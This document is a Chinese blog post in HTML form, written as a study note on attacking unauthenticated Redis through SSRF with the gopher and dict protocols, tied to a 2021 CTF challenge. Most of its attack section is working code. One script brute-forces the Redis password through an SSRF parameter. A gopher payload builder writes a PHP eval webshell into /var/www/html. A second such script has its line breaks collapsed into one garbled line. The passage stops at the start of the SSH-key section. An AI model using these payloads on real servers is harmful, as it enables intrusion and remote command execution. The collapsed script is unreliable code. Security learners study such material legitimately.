@@ -1,0 +1,1647 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SSRF---gopher和dict打redis, uf9n1x&#39;s blog">
+    <meta name="description" content="SSRF—gopher和dict打redis
+
+总结一下SSRF打redis(redis的未授权漏洞)
+[toc]
+redis简介redis是一个key-value存储系统，是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SSRF---gopher和dict打redis | uf9n1x&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://img-blog.csdnimg.cn/e6c3814fecb44593a5707e12753dfd5d.png);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="uf9n1x's blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+<!--动态诗词-->
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">uf9n1x&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">uf9n1x&#39;s blog</div>
+        <div class="logo-desc">
+            
+            websec
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SSRF---gopher和dict打redis</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ssrf/">
+                                <span class="chip bg-color">ssrf</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-31
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    19 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SSRF—gopher和dict打redis"><a href="#SSRF—gopher和dict打redis" class="headerlink" title="SSRF—gopher和dict打redis"></a>SSRF—gopher和dict打redis</h1><span id="more"></span>
+
+<p>总结一下SSRF打redis(redis的未授权漏洞)</p>
+<p>[toc]</p>
+<h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><p>redis是一个key-value存储系统，是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 字符串（strings）， 散列（hashes）， 列表（lists）， 集合（sets）， 有序集合（sorted sets） 与范围查询， bitmaps， hyperloglogs 和 地理空间（geospatial） 索引半径查询。 Redis 内置了 复制（replication），LUA脚本（Lua scripting）， LRU驱动事件（LRU eviction），事务（transactions） 和不同级别的 磁盘持久化（persistence）， 并通过 Redis哨兵（Sentinel）和自动 分区（Cluster）提供高可用性（high availability）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>
+<h3 id="redis常用命令"><a href="#redis常用命令" class="headerlink" title="redis常用命令"></a>redis常用命令</h3><pre class="line-numbers language-php"><code class="language-php">set xz <span class="token string">"Hacker"</span>                     <span class="token shell-comment comment"># 设置键xz的值为字符串Hacker</span>
+      get xz                              <span class="token shell-comment comment"># 获取键xz的内容</span>
+      <span class="token constant">SET</span> score <span class="token number">857</span>                       <span class="token shell-comment comment"># 设置键score的值为857</span>
+      <span class="token constant">INCR</span> score                          <span class="token shell-comment comment"># 使用INCR命令将score的值增加1</span>
+      <span class="token constant">GET</span> score                           <span class="token shell-comment comment"># 获取键score的内容</span>
+      keys <span class="token operator">*</span>                              <span class="token shell-comment comment"># 列出当前数据库中所有的键</span>
+      config set <span class="token keyword">protected</span><span class="token operator">-</span>mode no        <span class="token shell-comment comment"># 关闭安全模式</span>
+      get anotherkey                      <span class="token shell-comment comment"># 获取一个不存在的键的值</span>
+      config set dir <span class="token operator">/</span>root<span class="token operator">/</span>redis          <span class="token shell-comment comment"># 设置保存目录</span>
+      config set dbfilename redis<span class="token punctuation">.</span>rdb     <span class="token shell-comment comment"># 设置保存文件名</span>
+      config get dir                      <span class="token shell-comment comment"># 查看保存目录</span>
+      config get dbfilename               <span class="token shell-comment comment"># 查看保存文件名</span>
+      save                                <span class="token shell-comment comment"># 进行一次备份操作</span>
+      flushall                            <span class="token shell-comment comment"># 删除所有数据</span>
+      del key                             <span class="token shell-comment comment"># 删除键为key的数据</span>
+      slaveof ip port                 <span class="token shell-comment comment"># 设置主从关系</span>
+      redis<span class="token operator">-</span>cli <span class="token operator">-</span>h ip <span class="token operator">-</span>p <span class="token number">6379</span> <span class="token operator">-</span>a passwd   <span class="token shell-comment comment"># 外部连接</span>
+redis操作注意事项
+<span class="token number">1</span><span class="token punctuation">.</span>使用<span class="token constant">SET</span>和<span class="token constant">GET</span>命令，可以完成基本的赋值和取值操作；
+<span class="token number">2</span><span class="token punctuation">.</span>Redis是不区分命令的大小写的，set和<span class="token constant">SET</span>是同一个意思；
+<span class="token number">3</span><span class="token punctuation">.</span>使用keys <span class="token operator">*</span>可以列出当前数据库中的所有键；
+<span class="token number">4</span><span class="token punctuation">.</span>当尝试获取一个不存在的键的值时，Redis会返回空，即<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>；
+<span class="token number">5</span><span class="token punctuation">.</span>如果键的值中有空格，需要使用双引号括起来，如<span class="token string">"Hello World"</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="redis配置文件参数"><a href="#redis配置文件参数" class="headerlink" title="redis配置文件参数"></a>redis配置文件参数</h3><pre class="line-numbers language-php"><code class="language-php">port参数
+
+格式为port后面接端口号，如port <span class="token number">6379</span>，表示Redis服务器将在
+<span class="token number">6379</span>端口上进行监听来等待
+客户端的连接。一般我们用dict协议来爆破端口的开放情况
+
+
+bind参数
+
+格式为bind后面接<span class="token constant">IP</span>地址，可以同时绑定在多个<span class="token constant">IP</span>地址上，<span class="token constant">IP</span>地址之间用
+空格分离，如bind <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.100</span> <span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>，表允许<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.100</span>
+和<span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>两个<span class="token constant">IP</span>连接。如果设置为<span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span>则表示任意ip都可连接，
+说白了就是白名单。
+
+save参数
+
+格式为save <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>秒数</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>变化数</span><span class="token punctuation">></span></span></span>，表示在指定的秒数内数据库存在指定的
+改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存
+中的数据备份到磁盘上）。可以同时指定多个save参数，如：
+save <span class="token number">900</span> <span class="token number">1</span>
+save <span class="token number">300</span> <span class="token number">10</span>
+save <span class="token number">60</span> <span class="token number">10000</span>
+表示如果数据库的内容在<span class="token number">60</span>秒后产生了<span class="token number">10000</span>次改变，或者<span class="token number">300</span>秒后产生了<span class="token number">10</span>次改变，或者<span class="token number">900</span>秒后产生了<span class="token number">1</span>次改变，那么立即进行备份操作。
+
+requirepass参数
+
+格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。一般在打有认证的redis时，可能直接写脚本来爆破弱口令
+
+dir参数
+
+格式为dir后接指定的路径，默认为dir <span class="token punctuation">.</span><span class="token operator">/</span>，指明Redis的工作目录为当前目录，即redis<span class="token operator">-</span>server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。
+
+dbfilename参数
+
+格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump<span class="token punctuation">.</span>rdb，即备份文件的名字为dump<span class="token punctuation">.</span>rdb。
+
+config命令
+
+通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename<span class="token operator">-</span>command参数来对其进行重命名操作，如rename<span class="token operator">-</span>command <span class="token constant">CONFIG</span> <span class="token constant">HTCMD</span>，可以将<span class="token constant">CONFIG</span>命令重命名为<span class="token constant">HTCMD</span>。配置文件默认是没有对<span class="token constant">CONFIG</span>命令进行重命名操作的。
+
+<span class="token keyword">protected</span><span class="token operator">-</span>mode参数
+
+redis3<span class="token number">.2</span>之后添加了<span class="token keyword">protected</span><span class="token operator">-</span>mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为no。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="redis漏洞的利用方式"><a href="#redis漏洞的利用方式" class="headerlink" title="redis漏洞的利用方式"></a>redis漏洞的利用方式</h3><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">RDB</span> 持久化可以在指定的时间间隔内生成数据集的时间点快照
+<span class="token constant">AOF</span> 持久化记录服务器执行的所有写操作命令<span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p>
+<p>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p>
+<pre class="line-numbers language-php"><code class="language-php">原理：
+Redis 默认情况下，会绑定在 ip地址<span class="token punctuation">:</span><span class="token number">6379</span>，如果没有进行采用相关的策略，
+比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服
+务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可
+以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。
+
+攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 
+config 命令像目标主机写WebShell、写<span class="token constant">SSH</span>公钥、创建计划任务反弹Shell
+等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目
+录、<span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh目录或<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron目录等，然后将dbfilename（本地数据
+库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保
+存，则我们就指定的目录里写入指定的文件了。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="绝对路径写webshell-—有无认证均可"><a href="#绝对路径写webshell-—有无认证均可" class="headerlink" title="绝对路径写webshell —有无认证均可"></a>绝对路径写webshell —有无认证均可</h4><p>条件：</p>
+<p>知道网站绝对路径，并且需要增删改查权限</p>
+<p>root启动redis</p>
+<p>redis弱密码或者无密码</p>
+<pre class="line-numbers language-php"><code class="language-php">补充：若不知道物理路径，可尝试寻找网站的应用程序错误或者常见绝对路径去尝试。
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>一些命令(协议打可能用到)</p>
+<pre class="line-numbers language-php"><code class="language-php">redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.134</span> <span class="token shell-comment comment">#连接</span>
+
+Redis config set dir <span class="token operator">/</span>www<span class="token operator">/</span>admin<span class="token operator">/</span>localhost_80<span class="token operator">/</span>wwwroot <span class="token shell-comment comment">#设置要写入shell的路径</span>
+
+set xxx “\<span class="token package">n<span class="token punctuation">\</span>n<span class="token punctuation">\</span>n</span><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter">?></span>\<span class="token package">n<span class="token punctuation">\</span>n<span class="token punctuation">\</span>n</span>” <span class="token shell-comment comment">#写入phpinfo()到xxx键</span>
+
+config set dbfilename phpinfo<span class="token punctuation">.</span>php
+
+save
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>默认redis的端口是6379，如果改了，直接利用burp爆破端口</p>
+<p>然后如果redis需要为有认证的，需要密码，我们也可以利用脚本爆破弱口令的密码（在后面）</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse 
+
+url <span class="token operator">=</span> <span class="token string">"http://xx.xx.xx.xx:8000/ssrf.php?url="</span>
+
+param <span class="token operator">=</span> <span class="token string">'dict://127.0.0.1:6788/auth:'</span>
+
+<span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">'d:\test\top100.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#字典</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        passwd <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        all_url <span class="token operator">=</span> url <span class="token operator">+</span> param <span class="token operator">+</span> passwd
+        <span class="token comment" spellcheck="true"># print(all_url)</span>
+        request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>all_url<span class="token punctuation">)</span>
+        response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print(response)</span>
+        <span class="token keyword">if</span> <span class="token string">"+OK\r\n+OK\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#因为是不知道是否正确，可以用not in</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"redis passwd: "</span> <span class="token operator">+</span> passwd<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果不需要密码，直接用下面的脚本；如果有密码，用上面的脚本爆，再用下面的脚本构成payload。</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
+ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>
+port<span class="token operator">=</span><span class="token string">"6379"</span>
+shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>
+filename<span class="token operator">=</span><span class="token string">"1.php"</span>
+path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
+passwd<span class="token operator">=</span><span class="token string">""</span>        <span class="token comment" spellcheck="true">#如果无密码就不加，如果有密码就加 </span>
+cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
+     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"save"</span>
+     <span class="token punctuation">]</span>
+<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
+    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
+<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
+    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">=</span><span class="token string">""</span>
+    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
+        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">+=</span>CRLF
+    <span class="token keyword">return</span> cmd
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>再提供一个脚本</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-from urllib.parse import quotefrom urllib.request import Request, urlopenurl = "http://xxxxxx/?url="gopher = "gopher://127.0.0.1:6379/_"def get_password():    f = open("message.txt", "r")         #密码文件    return f.readlines()def encoder_url(cmd):    urlencoder = quote(cmd).replace("%0A", "%0D%0A")    return urlencoder###------暴破密码，无密码可删除-------###for password in get_password():    # 攻击脚本    path = "/var/www/html"    shell = "\\n\\n\\n&lt;?php eval($_POST['cmd']);?>\\n\\n\\n"    filename = "shell.php"cmd = </span><span class="token triple-quoted-string string">"""auth %squit"""</span> <span class="token operator">%</span> password<span class="token comment" spellcheck="true"># 二次编码encoder = encoder_url(encoder_url(cmd))# 生成payloadpayload = url + gopher + encoder# 发起请求print(payload)request = Request(payload)response = urlopen(request).read().decode()print("This time password is:" + password)print("Get response is:")print(response)if response.count("+OK") > 1:    print("find password : " + password)    #####---------------如无密码，直接从此开始执行---------------#####    cmd = </span><span class="token triple-quoted-string string">"""    auth %s    config set dir %s    config set dbfilename %s    set test1 "%s"    save    quit    """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password<span class="token punctuation">,</span> path<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> shell<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 二次编码  encoder = encoder_url(encoder_url(cmd))    # 生成payload   payload = url + gopher + encoder    # 发起请求    request = Request(payload)    print(payload)    response = urlopen(request).read().decode()    print("response is:" + response)    if response.count("+OK") > 5:        print("Write success！")        exit()    else:       print("Write failed. Please check and try again")        exit()    #####---------------如无密码，到此处结束------------------#####print("Password not found!")print("Please change the dictionary,and try again.")</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>CTF题就是：2021年极客大挑战的givemeyourlove</p>
+<h4 id="写-ssh-keygen-公钥登录服务器"><a href="#写-ssh-keygen-公钥登录服务器" class="headerlink" title="写 ssh-keygen 公钥登录服务器"></a>写 ssh-keygen 公钥登录服务器</h4><p>原理：</p>
+<p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p>
